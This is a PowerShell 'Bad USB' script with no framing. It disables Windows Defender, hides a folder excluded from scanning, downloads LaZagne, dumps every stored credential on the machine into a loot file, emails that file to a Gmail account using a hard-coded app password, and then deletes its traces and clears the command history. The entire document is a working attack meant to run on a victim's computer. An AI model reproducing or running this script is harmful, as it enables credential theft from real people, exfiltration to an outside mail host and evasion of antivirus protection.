Set-MpPreference -DisableRealtimeMonitoring $true

$dir = "C:\Users\$env:UserName\Downloads\tmp"
New-Item -ItemType Directory -Path $dir
Add-MpPreference -ExclusionPath $dir

$hide = Get-Item $dir -Force
$hide.attributes='Hidden'

Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/lazagne.exe" -OutFile "$dir\lazagne.exe"
& "$dir\lazagne.exe" all > "$dir\loot.txt"

#Mail
$smtp = "smtp.gmail.com"
$From = "undermusic3@gmail.com"
$To = "undermusic3@gmail.com"
$Subject = "Bad USB report"
$Body = "Here's what we've got!"

$Password = "bduujbmxampfuwzg" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password

Send-MailMessage -From $From -To $To -Subject $Subject -Body $Body -Attachments "$dir\loot.txt" -SmtpServer $smtp -port 587 -UseSsl -Credential $Credential

Remove-Item -Path $dir -Recurse -Force
Set-MpPreference -DisableRealtimeMonitoring $false
Remove-MpPreference -ExclusionPath $dir

Clear-History
